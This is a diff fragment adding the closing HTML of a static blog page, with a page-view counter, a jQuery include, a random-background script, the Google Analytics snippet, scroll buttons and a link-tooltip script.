+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit">本页阅读量: 
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+
+    </div>
+    <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+<script src="/js/main.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var backgroundnum = 24;
+            var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+        })
+    </script>
+
+
+<!-- Google Analytics -->
+<script type="text/javascript">
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'UA-87275583-1', 'auto');
+ga('send', 'pageview');
+
+</script>
+<!-- End Google Analytics -->
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    $(document).ready(function() {
+        if ($("#comments").length < 1) {
+            $("#scroll > a:nth-child(2)").hide();
+        };
+    })
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+  <script language="javascript">
+    $(function() {
+        $("a[title]").each(function() {
+            var a = $(this);
+            var title = a.attr('title');
+            if (title == undefined || title == "") return;
+            a.data('title', title).removeAttr('title').hover(
+
+            function() {
+                var offset = a.offset();
+                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
+                    top: offset.top - a.outerHeight() - 15,
+                    left: offset.left + a.outerWidth()/2 + 1
+                }).fadeIn(function() {
+                    var pop = $(this);
+                    setTimeout(function() {
+                        pop.remove();
+                    }, pop.text().length * 800);
+                });
+            }, function() {
+                $("#anchortitlecontainer").remove();
+            });
+        });
+    });
+</script>
+
+
+  </div>
+</body>
+</html>
